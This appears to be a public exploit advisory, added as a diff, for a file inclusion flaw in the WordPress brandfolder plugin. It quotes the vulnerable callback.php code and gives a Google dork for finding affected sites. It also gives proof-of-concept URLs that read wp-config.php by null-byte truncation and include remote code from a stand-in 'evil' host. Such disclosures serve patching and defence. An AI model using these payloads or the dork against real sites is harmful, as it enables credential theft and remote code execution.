@@ -1,0 +1,35 @@
+# Exploit Title: Wordpress brandfolder plugin / RFI & LFI
+# Google Dork: inurl:wp-content/plugins/brandfolder
+# Date: 03/22/2016
+# Exploit Author: AMAR^SHG
+# Vendor Homepage: https://brandfolder.com
+# Software Link: https://wordpress.org/plugins/brandfolder/
+# Version: <=3.0
+# Tested on: WAMP / Windows
+
+I-Details
+The vulnerability occurs at the first lines of the file callback.php:
+
+<?php
+  ini_set('display_errors',1);
+  ini_set('display_startup_errors',1);
+  error_reporting(-1);
+
+  require_once($_REQUEST['wp_abspath']  . 'wp-load.php');
+  require_once($_REQUEST['wp_abspath']  . 'wp-admin/includes/media.php');
+  require_once($_REQUEST['wp_abspath']  . 'wp-admin/includes/file.php');
+  require_once($_REQUEST['wp_abspath']  . 'wp-admin/includes/image.php');
+  require_once($_REQUEST['wp_abspath']  . 'wp-admin/includes/post.php');
+
+$_REQUEST is based on the user input, so as you can guess,
+an attacker can depending on the context, host on a malicious server
+a file called wp-load.php, and disable its execution using an htaccess, or
+abuse the null byte character ( %00, %2500 url-encoded)
+
+II-Proof of concept
+http://localhost/wp/wp-content/plugins/brandfolder/callback.php?wp_abspath=LFI/RFI
+http://localhost/wp/wp-content/plugins/brandfolder/callback.php?wp_abspath=../../../wp-config.php%00
+http://localhost/wp/wp-content/plugins/brandfolder/callback.php?wp_abspath=http://evil/
+
+Discovered by AMAR^SHG (aka kuroi'sh).
+Greetings to RxR & Nofawkx Al & HolaKo
